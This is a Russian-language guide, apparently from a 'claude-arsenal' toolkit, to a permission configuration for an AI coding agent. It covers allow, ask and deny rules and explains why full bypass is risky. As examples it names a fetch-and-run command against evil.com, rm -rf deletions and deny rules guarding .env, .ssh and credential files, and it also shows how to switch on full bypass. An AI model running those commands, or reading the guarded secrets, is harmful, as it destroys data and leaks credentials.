# Permissions — селективный bypass

`claude-arsenal` ставит в `~/.claude/settings.json` режим `acceptEdits` с белым списком частых команд. Это **не полный bypass** — опасные операции по-прежнему спрашивают.

## Что это значит на практике

| Действие | Поведение |
|----------|-----------|
| `Edit`, `Write` в проекте | ✅ Сразу, без подтверждения |
| `Bash(git status:*)` и другие 60+ безопасных команд | ✅ Сразу |
| `Bash(git push:*)` | ❓ Спрашивает (может что-то сломать) |
| `Bash(npm publish:*)` | ❓ Спрашивает (необратимо) |
| `Bash(rm:*)` и `rm -rf:*` | ❓ Спрашивает / запрещено |
| `Bash(sudo:*)` | ❌ Запрещено |
| `Read(.env, .ssh, credentials*)` | ❌ Запрещено |

## Почему `acceptEdits`, а не `bypassPermissions`

`bypassPermissions` — **полный карт-бланш**. Я могу выполнить **любую** команду, включая `curl evil.com | bash`, `rm -rf ~/*`, форс-пуш в main. Удобно, но:

- `deny` ловит **только прямые матчи** (например `Bash(rm -rf:*)` не ловит `sh -c "rm -rf /"`)
- Случайная ошибка (опечатка в пути) = потеря данных
- Промпт-инъекция в чужом файле = выполнение произвольного кода

`acceptEdits` снимает **90% шума** (не спрашивает на каждый Edit/Write и стандартные команды), но **сохраняет защиту** на деструктивное.

## Как поставить

```bash
# Из репо claude-arsenal
SET_PERMISSIONS=1 ./install.sh

# Или вручную: скопировать settings/settings.template.json в ~/.claude/settings.json
```

## Если хочется полный bypass

⚠️ **Только на свой страх и риск.** В `settings/settings.template.json` замени:
```json
"defaultMode": "acceptEdits"
```
на
```json
"defaultMode": "bypassPermissions"
```

Дополнительно можно добавить `"skipDangerousModePermissionPrompt": true`.

## Кастомизация

Добавляй свои команды в `allow`:
```json
"allow": [
  "Bash(your-command:*)",
  ...
]
```

Убирай ненужные из `allow` — тогда они попадут в `ask` или `deny`.

## Что НЕ в allow (но может быть нужно)

Если ты работаешь с чем-то специфическим (например `kubectl`, `terraform`, `docker compose`), добавь в `allow`:
```json
"Bash(kubectl:*)",
"Bash(terraform:*)",
"Bash(docker compose:*)",
```

---

## Tradeoff

`acceptEdits` — **баланс удобства и безопасности**. Если 90% твоей работы — это редактирование в проекте, ты не заметишь разницу с полным bypass. Если 10% — деструктивные операции, ты их всё равно делаешь редко и хочешь подтверждение.
